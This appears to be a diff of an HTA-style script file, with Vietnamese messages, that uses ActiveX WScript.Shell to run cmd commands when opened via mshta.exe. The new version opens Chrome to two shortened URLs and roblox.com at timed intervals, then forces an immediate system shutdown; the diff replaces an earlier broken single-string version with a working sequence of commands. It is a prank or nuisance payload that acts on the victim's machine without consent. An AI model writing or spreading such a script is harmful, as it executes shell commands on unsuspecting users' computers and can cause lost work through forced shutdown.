@@ -1,16 +1,15 @@
-<html>
-<head>
-  <script language="javascript">
-    try {
-      var shell = new ActiveXObject("WScript.Shell");
-      shell.Run("@echo off timeout /t 120 /nobreak start chrome https://tinyurl.com/lookmaxing timeout /t 120 /nobreak start chrome https://tinyurl.com/mrligmaballs timeout /t 120 /nobreak start chrome https://roblox.com timeout /t 60 /nobreak shutdown -s");
-      window.close();
-    } catch (e) {
-      alert("Không chạy được ActiveX! Phải mở bằng mshta.exe");
-    }
-  </script>
-</head>
-<body>
-  <h1>Đang thực thi lệnh CMD</h1>
-</body>
-</html>
+<script language="javascript">
+  try {
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("cmd /c start chrome https://tinyurl.com/lookmaxing");
+    shell.Run("cmd /c timeout /t 120 /nobreak");
+    shell.Run("cmd /c start chrome https://tinyurl.com/mrligmaballs");
+    shell.Run("cmd /c timeout /t 120 /nobreak");
+    shell.Run("cmd /c start chrome https://roblox.com");
+    shell.Run("cmd /c timeout /t 60 /nobreak");
+    shell.Run("cmd /c shutdown -s -t 0");
+    window.close();
+  } catch (e) {
+    alert("Không chạy được ActiveX!Phải mở bằng mshta.exe");
+  }
+</script>
